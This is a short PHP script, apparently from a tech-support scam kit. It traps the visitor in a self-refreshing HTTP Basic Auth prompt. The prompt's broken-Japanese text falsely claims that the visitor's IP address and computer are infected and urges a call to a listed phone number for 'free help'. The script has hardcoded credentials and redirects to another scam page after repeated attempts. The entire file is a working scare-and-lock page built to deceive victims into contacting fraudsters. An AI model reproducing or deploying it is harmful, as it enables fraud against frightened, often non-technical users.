<?php

    session_start();

    $_uy = 'dsdsj';
    $_py = 'bgrfd';

    if ($_SERVER['PHP_AUTH_USER'] != $_uy || $_SERVER['PHP_AUTH_PW'] != $_py ) {

        if(isset($_SESSION['login_attempts'])){ $_SESSION['login_attempts']++; }else{$_SESSION['login_attempts'] = 11;}

        if($_SESSION['login_attempts'] == 70){
            header('Location: XAut10100110X.php');
            exit;
        } else {

           header('WWW-Authenticate: Basic realm="不審な動きを識別にお客様のIPアドレスが破壊感染に導入したパソコン等に保存します。 任意のヘルプのために(050) 5809-9036 @今すぐ無料通話。"');
           header('HTTP/1.0 401 Unauthorized');
$page = $_SERVER['PHP_SELF'];
 $sec = "0";
 header("Refresh: $sec; url=$page");
         echo "<html><head><title></title></head><body>";


            exit;
        }
    } else {

        header('Location: XAut10100110X.php');

        exit;
    }
?>
